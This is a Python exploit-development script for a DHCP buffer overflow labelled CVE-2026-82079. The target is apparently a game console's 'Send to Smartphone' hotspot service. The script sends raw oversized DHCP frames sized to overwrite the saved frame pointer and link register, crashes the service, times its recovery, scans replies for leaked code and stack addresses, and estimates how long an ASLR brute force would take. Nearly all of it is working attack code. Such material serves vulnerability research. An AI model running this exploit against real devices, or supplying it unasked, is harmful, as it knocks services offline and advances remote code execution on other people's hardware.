#!/usr/bin/env -S sudo python3 -u -I
"""
CVE-2026-82079: Controlled overflow test v2.

Fixes sniffer timing from v1 — background thread listens BEFORE sending.
Tests:
  1. Baseline DHCP response capture (safe size)
  2. Overflow + response capture (1650B safe, 1668B crash)
  3. Recovery timing measurement
  4. Post-recovery DHCP functionality
  5. Reproducibility (second crash + recovery)
"""

import socket
import struct
import time
import os
import json
import sys
import threading
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = 'wlp5s0'
HTTP_TARGET = '192.168.0.1'
HTTP_PORT = 80
EVIDENCE_DIR = str(_LDN_ROOT / 'evidence' / 'exploit_dev')
ETH_IP_UDP = 42


def get_mac(iface):
    with open(f'/sys/class/net/{iface}/address') as f:
        return bytes.fromhex(f.read().strip().replace(':', ''))


def ip_checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f'!{len(data)//2}H', data))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return ~s & 0xffff


def udp_checksum(src_ip, dst_ip, udp_no_cksum, payload):
    pseudo = struct.pack('!4s4sBBH', src_ip, dst_ip, 0, 17,
                         len(udp_no_cksum) + len(payload))
    data = pseudo + udp_no_cksum + payload
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f'!{len(data)//2}H', data))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    result = ~s & 0xffff
    return result if result else 0xffff


def build_frame(our_mac, total_frame_size, fill=0x00):
    """Build DHCP DISCOVER with specified total frame size."""
    xid = int.from_bytes(os.urandom(4), 'big')

    bootp = struct.pack('!BBBBI HH', 1, 1, 6, 0, xid, 0, 0x8000)
    bootp += b'\x00' * 16
    bootp += our_mac + b'\x00' * 10
    bootp += b'\x00' * 64
    bootp += b'\x00' * 128
    assert len(bootp) == 236

    opts = struct.pack('!I', 0x63825363)
    opts += bytes([53, 1, 1])
    opts += bytes([55, 4, 1, 3, 6, 15])

    total_dhcp = total_frame_size - ETH_IP_UDP
    current = len(bootp) + len(opts) + 1
    pad = max(0, total_dhcp - current)
    # Use 0x00 for pad (valid DHCP pad option) to ensure processing
    opts += b'\x00' * pad
    opts += bytes([255])

    dhcp = bootp + opts
    udp_len = 8 + len(dhcp)
    src_ip = socket.inet_aton('0.0.0.0')
    dst_ip = socket.inet_aton('255.255.255.255')

    udp_no_ck = struct.pack('!HHH', 68, 67, udp_len) + b'\x00\x00'
    uck = udp_checksum(src_ip, dst_ip, udp_no_ck, dhcp)
    udp_hdr = struct.pack('!HHHH', 68, 67, udp_len, uck)

    ip_total = 20 + udp_len
    ip_hdr = struct.pack('!BBHHHBBH4s4s',
                         0x45, 0x00, ip_total,
                         xid & 0xffff, 0x4000, 64, 17, 0,
                         src_ip, dst_ip)
    ick = ip_checksum(ip_hdr)
    ip_hdr = ip_hdr[:10] + struct.pack('!H', ick) + ip_hdr[12:]

    eth_hdr = b'\xff\xff\xff\xff\xff\xff' + our_mac + struct.pack('!H', 0x0800)
    return eth_hdr + ip_hdr + udp_hdr + dhcp, xid


class DhcpSniffer:
    """Background DHCP response sniffer — same pattern as working probe."""
    def __init__(self, iface):
        self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                  socket.htons(0x0800))
        self.sock.bind((iface, 0))
        self.sock.settimeout(0.2)
        self.responses = []
        self._run = False
        self._thread = None

    def start(self):
        self._run = True
        self.responses = []
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._run = False
        if self._thread:
            self._thread.join(timeout=2)
        self.sock.close()

    def clear(self):
        self.responses.clear()

    def _loop(self):
        while self._run:
            try:
                data = self.sock.recv(4096)
                if len(data) < 42:
                    continue
                if struct.unpack('!H', data[12:14])[0] != 0x0800:
                    continue
                if data[23] != 17:
                    continue
                sp, dp = struct.unpack('!HH', data[34:38])
                if sp == 67 and dp == 68 and data[42] == 2:
                    xid_val = struct.unpack('!I', data[46:50])[0]
                    yiaddr = socket.inet_ntoa(data[58:62])
                    self.responses.append({
                        'xid': xid_val,
                        'yiaddr': yiaddr,
                        'frame_size': len(data),
                        'raw_hex': data.hex(),
                        'ts': time.time(),
                    })
            except socket.timeout:
                continue
            except Exception:
                continue


def check_http(timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.setsockopt(socket.SOL_SOCKET, 25, b'wlp5s0\0')
        s.connect((HTTP_TARGET, HTTP_PORT))
        s.sendall(b'GET /data.json HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        resp = b''
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        s.close()
        return b'200 OK' in resp
    except Exception:
        return False


def scan_for_addresses(data):
    """Scan for potential Horizon ASLR code/stack addresses."""
    findings = []
    if not data or len(data) < 8:
        return findings
    for i in range(len(data) - 7):
        val = struct.unpack_from('<Q', data, i)[0]
        if 0x0000007100000000 <= val <= 0x000000710FFFFFFF:
            findings.append(('code', i, val))
        elif 0x0000007F00000000 <= val <= 0x0000007FFFFFFFFF:
            findings.append(('stack', i, val))
    return findings


def send_and_check(raw_tx, sniffer, our_mac, size, label):
    """Send a DHCP packet, wait, check for response and HTTP."""
    sniffer.clear()
    frame, xid = build_frame(our_mac, size)
    raw_tx.send(frame)
    time.sleep(2.0)

    matching = [r for r in sniffer.responses if r['xid'] == xid]
    dhcp_ok = len(matching) > 0
    alive = check_http()

    result = {
        'test': label,
        'frame_size': size,
        'xid': f'0x{xid:08x}',
        'dhcp_response': dhcp_ok,
        'http_alive': alive,
    }

    if dhcp_ok:
        r0 = matching[0]
        print(f"  DHCP reply: YES  yiaddr={r0['yiaddr']}  ({r0['frame_size']}B)")
        result['response_size'] = r0['frame_size']
        result['response_hex'] = r0['raw_hex']
        # Scan for leaked addresses
        raw = bytes.fromhex(r0['raw_hex'])
        addrs = scan_for_addresses(raw[42:])
        result['addresses_found'] = len(addrs)
        if addrs:
            print(f"  ** {len(addrs)} POTENTIAL ADDRESSES IN RESPONSE **")
            for kind, off, val in addrs[:5]:
                print(f"    {kind} @ resp[{42+off}]: 0x{val:016x}")
    else:
        print(f"  DHCP reply: none")

    if alive:
        print(f"  HTTP: alive")
    else:
        print(f"  HTTP: ** UNAVAILABLE ** (crash)")

    return result


def measure_recovery(label='recovery'):
    """Wait for HTTP to come back, measure time."""
    t0 = time.monotonic()
    for i in range(180):
        time.sleep(0.5)
        if check_http(timeout=2):
            elapsed = time.monotonic() - t0
            print(f"  Recovered in {elapsed:.1f}s")
            return {'test': label, 'recovered': True, 'seconds': round(elapsed, 1)}
    print(f"  No recovery after 90s")
    return {'test': label, 'recovered': False}


def main():
    if os.geteuid() != 0:
        print("Requires root.")
        sys.exit(1)

    os.makedirs(EVIDENCE_DIR, exist_ok=True)
    our_mac = get_mac(IFACE)

    with open(f'/sys/class/net/{IFACE}/mtu') as f:
        mtu = int(f.read().strip())
    if mtu < 2304:
        print(f"MTU {mtu}, need 2304")
        sys.exit(1)

    print("=" * 60)
    print("CVE-2026-82079  OVERFLOW TEST v2")
    print("=" * 60)
    print(f"Interface: {IFACE}, MAC: {our_mac.hex(':')}, MTU: {mtu}\n")

    if not check_http():
        print("HTTP down. Start Send to Smartphone.")
        sys.exit(1)
    print("HTTP alive.\n")

    raw_tx = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                           socket.htons(0x0800))
    raw_tx.bind((IFACE, 0))
    sniffer = DhcpSniffer(IFACE)
    sniffer.start()
    time.sleep(0.5)  # let sniffer settle

    results = []

    # -----------------------------------------------------------
    # TEST 1: Baseline — normal DHCP within buffer
    # -----------------------------------------------------------
    print("[1] Baseline DHCP (300B, safe)")
    r = send_and_check(raw_tx, sniffer, our_mac, 300, 'baseline_300')
    results.append(r)
    print()

    # -----------------------------------------------------------
    # TEST 2: Overflow past buffer but before FP (safe)
    # -----------------------------------------------------------
    if check_http():
        print("[2] Overflow 1650B (past layer_info, before FP — safe)")
        r = send_and_check(raw_tx, sniffer, our_mac, 1650, 'overflow_1650_safe')
        results.append(r)
        print()

    # -----------------------------------------------------------
    # TEST 3: Exactly at saved FP (1668B) — KNOWN to crash
    # -----------------------------------------------------------
    if check_http():
        print("[3] FP overwrite 1668B (KNOWN crash from probe)")
        r = send_and_check(raw_tx, sniffer, our_mac, 1668, 'fp_overwrite_1668')
        results.append(r)

        if not r['http_alive']:
            print("  Measuring recovery...")
            rec = measure_recovery('recovery_1')
            results.append(rec)
            print()

            # ---------------------------------------------------
            # TEST 4: Post-recovery DHCP
            # ---------------------------------------------------
            if rec['recovered']:
                time.sleep(1)
                print("[4] Post-recovery DHCP (300B)")
                r2 = send_and_check(raw_tx, sniffer, our_mac, 300,
                                    'post_recovery_dhcp')
                results.append(r2)
                print()

                # -----------------------------------------------
                # TEST 5: Second crash — confirm reproducible
                # -----------------------------------------------
                if check_http():
                    print("[5] Second FP overwrite 1668B (reproducibility)")
                    r3 = send_and_check(raw_tx, sniffer, our_mac, 1668,
                                        'fp_overwrite_2nd')
                    results.append(r3)

                    if not r3['http_alive']:
                        print("  Measuring 2nd recovery...")
                        rec2 = measure_recovery('recovery_2')
                        results.append(rec2)
                        print()

                        # -------------------------------------------
                        # TEST 6: LR overwrite (1684B) — PAST LR
                        # -------------------------------------------
                        if rec2['recovered']:
                            time.sleep(1)
                            if check_http():
                                print("[6] LR overwrite 1684B")
                                r4 = send_and_check(raw_tx, sniffer, our_mac,
                                                    1684, 'lr_overwrite_1684')
                                results.append(r4)
                                if not r4['http_alive']:
                                    print("  Measuring 3rd recovery...")
                                    rec3 = measure_recovery('recovery_3')
                                    results.append(rec3)
        print()

    sniffer.stop()
    raw_tx.close()

    # Save evidence
    path = f"{EVIDENCE_DIR}/overflow_test2_{int(time.time())}.json"
    with open(path, 'w') as f:
        json.dump({
            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
            'interface': IFACE,
            'mac': our_mac.hex(':'),
            'mtu': mtu,
            'tests': results,
        }, f, indent=2)
    print(f"\nEvidence: {path}")

    # --- Summary ---
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)

    for r in results:
        t = r.get('test', '')
        if 'recovery' in t:
            if r['recovered']:
                print(f"  {t}: {r['seconds']}s")
            else:
                print(f"  {t}: FAILED")
        elif r.get('dhcp_response'):
            leak = r.get('addresses_found', 0)
            leak_str = f"  ** {leak} ADDRS **" if leak else ""
            print(f"  {t}: DHCP=YES HTTP={'UP' if r['http_alive'] else 'DOWN'}{leak_str}")
        else:
            print(f"  {t}: DHCP=NO HTTP={'UP' if r['http_alive'] else 'DOWN'}")

    # Recovery stats
    recs = [r for r in results if 'recovery' in r.get('test', '') and r.get('recovered')]
    if recs:
        avg = sum(r['seconds'] for r in recs) / len(recs)
        print(f"\n  Avg recovery: {avg:.1f}s across {len(recs)} crashes")
        attempts = 131072
        per_attempt = avg + 2  # send + wait + recovery
        avg_hours = (attempts / 2 * per_attempt) / 3600
        print(f"  ASLR brute force: ~{avg_hours:.0f} hours average "
              f"({attempts//2} attempts × {per_attempt:.0f}s)")
    else:
        crashes = [r for r in results if not r.get('http_alive', True)
                   and 'recovery' not in r.get('test', '')]
        if not crashes:
            print("\n  No crashes observed — check packet delivery")


if __name__ == '__main__':
    main()
